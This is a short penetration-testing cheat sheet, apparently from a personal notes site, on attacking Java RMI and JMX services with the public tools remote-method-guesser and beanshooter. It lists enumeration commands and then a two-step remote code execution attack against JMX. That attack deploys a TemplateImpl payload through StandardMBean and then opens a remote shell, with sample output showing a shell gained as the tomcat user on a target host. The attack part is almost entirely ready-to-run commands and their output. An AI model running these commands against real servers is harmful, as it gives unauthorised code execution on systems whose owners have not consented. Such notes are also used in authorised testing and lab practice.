---
title: "Java RMI"
date: 2025-7-30
tags: ["Java", "RMI", "JMX", "Remote Method Invocation", "Api", "JVM", "Enum", "rmg", "beansshooter"]
---

### RMI (Remote Method Invocation)

{{< tab set1 tab1 >}}rmg{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### Enum

```console
java -jar rmg.jar enum <TARGET> <PORT>
```

<small>*Ref: [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)*</small>

{{< /tabcontent >}}

---

### JMX (Java Management Extensions)

{{< tab set2 tab1 >}}beanshooter{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### Enum

```console
java -jar beanshooter.jar enum <TARGET> <PORT>
```

#### RCE

```console
# 1. Upload payload
java -jar beanshooter.jar standard <TARGET> <PORT> tonka
```

```console {class="sample-code"}
$ java -jar beanshooter.jar standard 10.10.69.227 2222 tonka
[+] Creating a TemplateImpl payload object to abuse StandardMBean
[+]
[+]     Deplyoing MBean: StandardMBean
[+]     MBean with object name de.qtc.beanshooter:standard=5515770682654 was successfully deployed.
[+]
[+]     Caught NullPointerException while invoking the newTransformer action.
[+]     This is expected bahavior and the attack most likely worked :)
[+]
[+]     Removing MBean with ObjectName de.qtc.beanshooter:standard=5515770682654 from the MBeanServer.
[+]     MBean was successfully removed.
```

```console
# 2. RCE
java -jar beanshooter.jar tonka shell <TARGET> <PORT>
```

```console {class="sample-code"}
$ java -jar beanshooter.jar tonka shell 10.10.69.227 2222
[tomcat@10.10.69.227 /]$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

<small>*Ref: [beanshooter](https://github.com/qtc-de/beanshooter)*</small>

{{< /tabcontent >}}

